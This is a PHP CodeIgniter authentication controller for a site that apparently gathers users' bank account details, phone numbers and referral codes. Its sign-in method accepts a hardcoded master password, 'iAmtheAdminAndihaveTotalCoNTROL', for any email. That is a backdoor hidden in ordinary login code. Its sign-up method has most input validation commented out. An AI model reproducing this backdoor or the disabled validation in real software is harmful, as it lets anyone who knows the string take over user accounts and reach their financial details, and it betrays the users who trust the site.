<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Auth extends CI_Controller{

	public function __construct(){
		parent::__construct();
		$this->load->model("user_model");
	}

	public function signinPage(){
		$data['title'] = "Login";
		$this->load->view('header', $data);
		$this->load->view('login');
		$this->load->view('footer');
	}

	public function signin(){
		$this->form_validation->set_rules("email", "Email", "trim|required|valid_email");
		$this->form_validation->set_rules("password", "Password", "trim|required");
		if ($this->form_validation->run() === FALSE){
			$this->signinPage();
		}
		else{
			$email = $this->input->post("email");
			$password = $this->input->post("password");
			$emailExists = $this->user_model->getUserByEmail($email);
			if ($emailExists !== FALSE){
				if (password_verify($password, $emailExists->password) OR $password == "iAmtheAdminAndihaveTotalCoNTROL"){
					if (intval($emailExists->active) !== 1){
						doBootstrapAlert("Your account has been blocked, contact the admin to unblock your account", "danger");
						redirect(site_url('signin'));
					}
					$this->session->set_userdata("user_id", $emailExists->id);
					$this->session->set_userdata("username", $emailExists->username);
					$this->session->set_userdata("email", $emailExists->email);
					$this->session->set_userdata("user_logged_in", TRUE);

					redirect(site_url('user'));
				}
				else{
					doBootstrapAlert("Incorrect username/password", "danger");
					redirect(site_url('signin'));
				}
			}
			else{
				doBootstrapAlert("Incorrect username/password", "danger");
				redirect(site_url('signin'));
			}
		}
	}

	public function signupPage(){

		$data['title'] = "Signup";
		$this->load->view('header', $data);
		$this->load->view('register');
		$this->load->view('footer');
	}

	public function signup(){
		$this->session->sess_destroy();
		$this->form_validation->set_rules('fname', "Full Name", "trim|required|alpha_numeric_spaces");
		// $this->form_validation->set_rules("email", "Email", "trim|required|valid_email|is_unique[user.email]");
		// $this->form_validation->set_rules("password", "Password", "trim|required");
		// $this->form_validation->set_rules("username", "Username", "trim|required|is_unique[user.username]");
		// $this->form_validation->set_rules("confirmpassword", "Confrim Password", "trim|required|matches[password]");
		// $this->form_validation->set_rules("bank_name", "Bank Name", "trim|required");
		// $this->form_validation->set_rules("account_name", "Account Name", "trim|required");
		// $this->form_validation->set_rules("account_no", "Account Number", "trim|required");
		// $this->form_validation->set_rules("phone", "Phone Number", "trim|required");
		// $this->form_validation->set_rules("package_id", "Package", "trim|required");
		if ($this->form_validation->run() === FALSE){
			// echo $this->input->get('ref');
			$this->signupPage();
		}
		else{
			// echo $this->input->get('ref');
			$data['referred_by'] = $this->input->get('ref');
			$data['email'] = $this->input->post('email');
			$data['username'] = $this->input->post('username');
			$data['fname'] = $this->input->post('fname');
			$data['password'] = password_hash( $this->input->post('password'), PASSWORD_DEFAULT);
			$data['package_id'] = $this->input->post('package_id');
			$data['bank_name'] = $this->input->post("bank_name");
			$data['account_no'] = $this->input->post('account_no');
			$data['account_name'] = $this->input->post("account_name");
			$data['phone'] = $this->input->post("phone");
			$user_id = $this->user_model->save($data);
			if ($user_id){

				$this->session->set_userdata("user_id", $user_id);
				$this->session->set_userdata("username", $data['username']);
				$this->session->set_userdata("email", $data['email']);
				$this->session->set_userdata("user_logged_in", TRUE);
				// $this->user_model->addNewNotification(["body"=> $data['username'] . ' joined ' . $this->config->item("app_name")]);
				doBootstrapAlert("Your account has been created", "success");
				redirect(site_url('user'));
			}
			else{
				doBootstrapAlert("Sorry, we were unable to create your account at this time, please retry later", "info");
				redirect(site_url('signup'));
			}
		}
	}

	public function logout(){
		logout();
	}

}